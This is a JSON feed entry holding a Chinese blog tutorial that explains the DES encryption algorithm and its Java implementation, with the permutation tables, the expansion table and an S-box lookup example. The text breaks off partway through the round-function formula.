{
    "version": "https://jsonfeed.org/version/1",
    "title": "SnowRoll Blog • All posts by \"computer science\" category",
    "description": "分享经验，记录生活",
    "home_page_url": "https://snowroll.github.io",
    "items": [
        {
            "id": "https://snowroll.github.io/DES/",
            "url": "https://snowroll.github.io/DES/",
            "title": "DES加密算法",
            "date_published": "2024-11-17T10:00:00.000Z",
            "content_html": "<h1 id=\"data-encryption-standard-des\"><a class=\"markdownIt-Anchor\" href=\"#data-encryption-standard-des\">#</a> DATA ENCRYPTION STANDARD (DES)</h1>\n<p>DES 是经典的对称加密算法，今天我们结合 DES 的<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jc3JjLm5pc3QuZ292L2ZpbGVzL3B1YnMvZmlwcy80Ni0zL2ZpbmFsL2RvY3MvZmlwczQ2LTMucGRm\">官方设计文档</span>，使用 java 来实现 DES 加密算法。</p>\n<p>DES 算法设计的目标是使用 64 位的控制密钥 Key 来加解密 64 位的块数据。解密实际上为加密的逆过程，两者需使用相同的 Key。</p>\n<h1 id=\"des加密流程\"><a class=\"markdownIt-Anchor\" href=\"#des加密流程\">#</a> DES 加密流程</h1>\n<p>对于一个块数据，首先 1）使用初始置换<strong> IP</strong> 更改块中数据的位置。之后 2）经过一系列基于 key 的复杂运算<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>f</mi></mrow><annotation encoding=\"application/x-tex\">f</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span></span></span></span>，最终 3）使用初始置换的逆<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>I</mi><msup><mi>P</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding=\"application/x-tex\">IP^{-1}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span></span></span></span> 来还原块中数据位置。</p>\n<p>解密流程与加密流程相同，利用异或操作的自反性，即<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi><mo>⊕</mo><mi>f</mi><mo>⊕</mo><mi>f</mi><mo>=</mo><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x \\oplus f \\oplus f = x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊕</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊕</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">x</span></span></span></span> 来完成数据块的还原。</p>\n<p>具体流程图如下所示：</p>\n<img data-src=\"/DES/DES.png\" class=\"\">\n<p>具体加密过程中，数据块会被分为左右两部分，即<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>L</mi><mi>n</mi></msub></mrow><annotation encoding=\"application/x-tex\">L_{n}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 和<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>R</mi><mi>n</mi></msub></mrow><annotation encoding=\"application/x-tex\">R_{n}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>。共进行 16 轮加密变化，每轮只处理<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>L</mi><mi>n</mi></msub></mrow><annotation encoding=\"application/x-tex\">L_{n}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 的数据，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>R</mi><mi>n</mi></msub></mrow><annotation encoding=\"application/x-tex\">R_{n}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 直接作为下一轮的左半边输入<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>L</mi><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>=</mo><msub><mi>R</mi><mi>n</mi></msub></mrow><annotation encoding=\"application/x-tex\">L_{n+1} = R_{n}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.891661em;vertical-align:-0.208331em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.301108em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span><span class=\"mbin mtight\">+</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.208331em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>。</p>\n<p>从上图我们可以看到 16 轮，共有 16 个不同的密钥<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>K</mi><mi>n</mi></msub></mrow><annotation encoding=\"application/x-tex\">K_{n}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>。这些密钥都是从最初的密钥 key，通过密钥调度算法（key schedule， KS）计算得到的。</p>\n<h1 id=\"des算法细节及相关代码\"><a class=\"markdownIt-Anchor\" href=\"#des算法细节及相关代码\">#</a> DES 算法细节及相关代码</h1>\n<h2 id=\"初始置换ip\"><a class=\"markdownIt-Anchor\" href=\"#初始置换ip\">#</a> 初始置换 IP</h2>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span>[] IP = &#123;</span><br><span class=\"line\">    <span class=\"number\">58</span>, <span class=\"number\">50</span>, <span class=\"number\">42</span>, <span class=\"number\">34</span>, <span class=\"number\">26</span>, <span class=\"number\">18</span>, <span class=\"number\">10</span>, <span class=\"number\">2</span>,</span><br><span class=\"line\">    <span class=\"number\">60</span>, <span class=\"number\">52</span>, <span class=\"number\">44</span>, <span class=\"number\">36</span>, <span class=\"number\">28</span>, <span class=\"number\">20</span>, <span class=\"number\">12</span>, <span class=\"number\">4</span>,</span><br><span class=\"line\">    <span class=\"number\">62</span>, <span class=\"number\">54</span>, <span class=\"number\">46</span>, <span class=\"number\">38</span>, <span class=\"number\">30</span>, <span class=\"number\">22</span>, <span class=\"number\">14</span>, <span class=\"number\">6</span>,</span><br><span class=\"line\">    <span class=\"number\">64</span>, <span class=\"number\">56</span>, <span class=\"number\">48</span>, <span class=\"number\">40</span>, <span class=\"number\">32</span>, <span class=\"number\">24</span>, <span class=\"number\">16</span>, <span class=\"number\">8</span>,</span><br><span class=\"line\">    <span class=\"number\">57</span>, <span class=\"number\">49</span>, <span class=\"number\">41</span>, <span class=\"number\">33</span>, <span class=\"number\">25</span>, <span class=\"number\">17</span>,  <span class=\"number\">9</span>, <span class=\"number\">1</span>,</span><br><span class=\"line\">    <span class=\"number\">59</span>, <span class=\"number\">51</span>, <span class=\"number\">43</span>, <span class=\"number\">35</span>, <span class=\"number\">27</span>, <span class=\"number\">19</span>, <span class=\"number\">11</span>, <span class=\"number\">3</span>,</span><br><span class=\"line\">    <span class=\"number\">61</span>, <span class=\"number\">53</span>, <span class=\"number\">45</span>, <span class=\"number\">37</span>, <span class=\"number\">29</span>, <span class=\"number\">21</span>, <span class=\"number\">13</span>, <span class=\"number\">5</span>,</span><br><span class=\"line\">    <span class=\"number\">63</span>, <span class=\"number\">55</span>, <span class=\"number\">47</span>, <span class=\"number\">39</span>, <span class=\"number\">31</span>, <span class=\"number\">23</span>, <span class=\"number\">15</span>, <span class=\"number\">7</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>58，意味着将块数据中第 58 位的数据移到第 1 位。</p>\n<h2 -1=\"\" id=\"初始置换的逆ip\"><a class=\"markdownIt-Anchor\" href=\"#初始置换的逆ip\">#</a> 初始置换的逆IP^</h2>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span>[] FP = &#123;</span><br><span class=\"line\">    <span class=\"number\">40</span>, <span class=\"number\">8</span>, <span class=\"number\">48</span>, <span class=\"number\">16</span>, <span class=\"number\">56</span>, <span class=\"number\">24</span>, <span class=\"number\">64</span>, <span class=\"number\">32</span>,</span><br><span class=\"line\">    <span class=\"number\">39</span>, <span class=\"number\">7</span>, <span class=\"number\">47</span>, <span class=\"number\">15</span>, <span class=\"number\">55</span>, <span class=\"number\">23</span>, <span class=\"number\">63</span>, <span class=\"number\">31</span>,</span><br><span class=\"line\">    <span class=\"number\">38</span>, <span class=\"number\">6</span>, <span class=\"number\">46</span>, <span class=\"number\">14</span>, <span class=\"number\">54</span>, <span class=\"number\">22</span>, <span class=\"number\">62</span>, <span class=\"number\">30</span>,</span><br><span class=\"line\">    <span class=\"number\">37</span>, <span class=\"number\">5</span>, <span class=\"number\">45</span>, <span class=\"number\">13</span>, <span class=\"number\">53</span>, <span class=\"number\">21</span>, <span class=\"number\">61</span>, <span class=\"number\">29</span>,</span><br><span class=\"line\">    <span class=\"number\">36</span>, <span class=\"number\">4</span>, <span class=\"number\">44</span>, <span class=\"number\">12</span>, <span class=\"number\">52</span>, <span class=\"number\">20</span>, <span class=\"number\">60</span>, <span class=\"number\">28</span>,</span><br><span class=\"line\">    <span class=\"number\">35</span>, <span class=\"number\">3</span>, <span class=\"number\">43</span>, <span class=\"number\">11</span>, <span class=\"number\">51</span>, <span class=\"number\">19</span>, <span class=\"number\">59</span>, <span class=\"number\">27</span>,</span><br><span class=\"line\">    <span class=\"number\">34</span>, <span class=\"number\">2</span>, <span class=\"number\">42</span>, <span class=\"number\">10</span>, <span class=\"number\">50</span>, <span class=\"number\">18</span>, <span class=\"number\">58</span>, <span class=\"number\">26</span>,</span><br><span class=\"line\">    <span class=\"number\">33</span>, <span class=\"number\">1</span>, <span class=\"number\">41</span>,  <span class=\"number\">9</span>, <span class=\"number\">49</span>, <span class=\"number\">17</span>, <span class=\"number\">57</span>, <span class=\"number\">25</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>这个逆置换中，我们可以看到第 58 个数字为 1，即将第 1 位的数据还原回第 58 位。</p>\n<h2 id=\"加密计算\"><a class=\"markdownIt-Anchor\" href=\"#加密计算\">#</a> 加密计算</h2>\n<p>我们将 64 位的输入分为左右两个连续的 32 位块数据，即<strong> L</strong> 和<strong> R</strong>。输入可表示为<strong> LR</strong>。</p>\n<p>每一轮的迭代输出 L’R’由下面计算过程获得：</p>\n<p><strong>L’ = R</strong></p>\n<p><strong>R’ = <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>L</mi><mo>⊕</mo><mi>f</mi><mo stretchy=\"false\">(</mo><mi>R</mi><mo separator=\"true\">,</mo><mi>K</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">L \\oplus f(R, K)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.76666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">L</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊕</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"mclose\">)</span></span></span></span></strong></p>\n<p>其中<strong> K</strong> 是一个由 64 位原始 key 选择得到的 48 位块。<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo>⊕</mo></mrow><annotation encoding=\"application/x-tex\">\\oplus</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord\">⊕</span></span></span></span> 操作指位与位的异或。</p>\n<p>密钥调度算法我们稍后再详细介绍，目前先将整体的加密流程完整顺一遍。</p>\n<h3 id=\"加密函数fr-k\"><a class=\"markdownIt-Anchor\" href=\"#加密函数fr-k\">#</a> 加密函数<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>f</mi><mo stretchy=\"false\">(</mo><mi>R</mi><mo separator=\"true\">,</mo><mi>K</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">f(R, K)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"mclose\">)</span></span></span></span></h3>\n<p>先看完整流程图</p>\n<img data-src=\"/DES/function.png\" class=\"\">\n<ol>\n<li><strong>E</strong> 为扩展变化，将 32 位的<strong> R</strong> 扩展为 48 位，其中多出的 16 位为重复数据。扩展表如下所示</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span>[] E = &#123;</span><br><span class=\"line\">    <span class=\"number\">32</span>,  <span class=\"number\">1</span>,  <span class=\"number\">2</span>,  <span class=\"number\">3</span>,  <span class=\"number\">4</span>,  <span class=\"number\">5</span>, </span><br><span class=\"line\">     <span class=\"number\">4</span>,  <span class=\"number\">5</span>,  <span class=\"number\">6</span>,  <span class=\"number\">7</span>,  <span class=\"number\">8</span>,  <span class=\"number\">9</span>, </span><br><span class=\"line\">     <span class=\"number\">8</span>,  <span class=\"number\">9</span>, <span class=\"number\">10</span>, <span class=\"number\">11</span>, <span class=\"number\">12</span>, <span class=\"number\">13</span>, </span><br><span class=\"line\">    <span class=\"number\">12</span>, <span class=\"number\">13</span>, <span class=\"number\">14</span>, <span class=\"number\">15</span>, <span class=\"number\">16</span>, <span class=\"number\">17</span>,</span><br><span class=\"line\">    <span class=\"number\">16</span>, <span class=\"number\">17</span>, <span class=\"number\">18</span>, <span class=\"number\">19</span>, <span class=\"number\">20</span>, <span class=\"number\">21</span>, </span><br><span class=\"line\">    <span class=\"number\">20</span>, <span class=\"number\">21</span>, <span class=\"number\">22</span>, <span class=\"number\">23</span>, <span class=\"number\">24</span>, <span class=\"number\">25</span>, </span><br><span class=\"line\">    <span class=\"number\">24</span>, <span class=\"number\">25</span>, <span class=\"number\">26</span>, <span class=\"number\">27</span>, <span class=\"number\">28</span>, <span class=\"number\">29</span>, </span><br><span class=\"line\">    <span class=\"number\">28</span>, <span class=\"number\">29</span>, <span class=\"number\">30</span>, <span class=\"number\">31</span>, <span class=\"number\">32</span>,  <span class=\"number\">1</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>\n<p><strong>R</strong> 扩展之后与 48 位的轮密钥<strong> K</strong> 做异或操作，得到 48 位的输出。</p>\n</li>\n<li>\n<p>48 位输出，经过 8 个选择函数（select functions），获得 32 位的结果。我们称这些选择函数为 S 盒（Substitution Box）。</p>\n<p><strong>S 盒替换</strong><br>\n用于非线性替换，同时使得输入输出映射更加复杂化，使得加密过程更加复杂和安全。</p>\n<ul>\n<li>输入： 6 位二进制</li>\n<li>输出： 4 位二进制</li>\n<li>S 盒示例，S1</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>行 / 列</th>\n<th>0</th>\n<th>1</th>\n<th>2</th>\n<th>3</th>\n<th>4</th>\n<th>5</th>\n<th>6</th>\n<th>7</th>\n<th>8</th>\n<th>9</th>\n<th>10</th>\n<th>11</th>\n<th>12</th>\n<th>13</th>\n<th>14</th>\n<th>15</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>0</strong></td>\n<td>14</td>\n<td>4</td>\n<td>13</td>\n<td>1</td>\n<td>2</td>\n<td>15</td>\n<td>11</td>\n<td>8</td>\n<td>3</td>\n<td>10</td>\n<td>6</td>\n<td>12</td>\n<td>5</td>\n<td>9</td>\n<td>0</td>\n<td>7</td>\n</tr>\n<tr>\n<td><strong>1</strong></td>\n<td>0</td>\n<td>15</td>\n<td>7</td>\n<td>4</td>\n<td>14</td>\n<td>2</td>\n<td>13</td>\n<td>1</td>\n<td>10</td>\n<td>6</td>\n<td>12</td>\n<td>11</td>\n<td>9</td>\n<td>5</td>\n<td>3</td>\n<td>8</td>\n</tr>\n<tr>\n<td><strong>2</strong></td>\n<td>4</td>\n<td>1</td>\n<td>14</td>\n<td>8</td>\n<td>13</td>\n<td>6</td>\n<td>2</td>\n<td>11</td>\n<td>15</td>\n<td>12</td>\n<td>9</td>\n<td>7</td>\n<td>5</td>\n<td>10</td>\n<td>3</td>\n<td>0</td>\n</tr>\n<tr>\n<td><strong>3</strong></td>\n<td>15</td>\n<td>12</td>\n<td>8</td>\n<td>2</td>\n<td>4</td>\n<td>9</td>\n<td>1</td>\n<td>7</td>\n<td>5</td>\n<td>11</td>\n<td>3</td>\n<td>14</td>\n<td>10</td>\n<td>0</td>\n<td>6</td>\n<td>13</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>\n<p>替换过程示例：</p>\n<p>假设输入为 6 位二进制串 011011</p>\n<ul>\n<li>\n<p>输入第 1 位和第 6 位，作为行索引 01（即第一行）</p>\n</li>\n<li>\n<p>输入第 2-5 位，作为列索引 1101（即第 13 列）</p>\n</li>\n<li>\n<p>查找 S1 盒，得到<strong> 5</strong>，将其转换为 4 位二进制 0101</p>\n</li>\n<li>\n<p>结果：011011 =&gt; 0101</p>\n</li>\n</ul>\n<p>完整的 S 盒可见<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jc3JjLm5pc3QuZ292L2ZpbGVzL3B1YnMvZmlwcy80Ni0zL2ZpbmFsL2RvY3MvZmlwczQ2LTMucGRm\">官方文档</span>。</p>\n</li>\n</ul>\n</li>\n<li>\n<p>P 置换</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span>[] P = &#123;</span><br><span class=\"line\">    <span class=\"number\">16</span>,  <span class=\"number\">7</span>, <span class=\"number\">20</span>, <span class=\"number\">21</span>, </span><br><span class=\"line\">    <span class=\"number\">29</span>, <span class=\"number\">12</span>, <span class=\"number\">28</span>, <span class=\"number\">17</span>,</span><br><span class=\"line\">     <span class=\"number\">1</span>, <span class=\"number\">15</span>, <span class=\"number\">23</span>, <span class=\"number\">26</span>, </span><br><span class=\"line\">     <span class=\"number\">5</span>, <span class=\"number\">18</span>, <span class=\"number\">31</span>, <span class=\"number\">10</span>,</span><br><span class=\"line\">     <span class=\"number\">2</span>,  <span class=\"number\">8</span>, <span class=\"number\">24</span>, <span class=\"number\">14</span>, </span><br><span class=\"line\">    <span class=\"number\">32</span>, <span class=\"number\">27</span>,  <span class=\"number\">3</span>,  <span class=\"number\">9</span>,</span><br><span class=\"line\">    <span class=\"number\">19</span>, <span class=\"number\">13</span>, <span class=\"number\">30</span>,  <span class=\"number\">6</span>, </span><br><span class=\"line\">    <span class=\"number\">22</span>, <span class=\"number\">11</span>,  <span class=\"number\">4</span>, <span class=\"number\">25</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>至此，我们可以获得<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>R</mi><mi>n</mi></msub><mo>=</mo><msub><mi>L</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>⊕</mo><mi>f</mi><mo stretchy=\"false\">(</mo><msub><mi>R</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo separator=\"true\">,</mo><msub><mi>K</mi><mi>n</mi></msub><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">R_{n} = L_{n-1} \\oplus f(R_{n-1}, K_{n})</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span 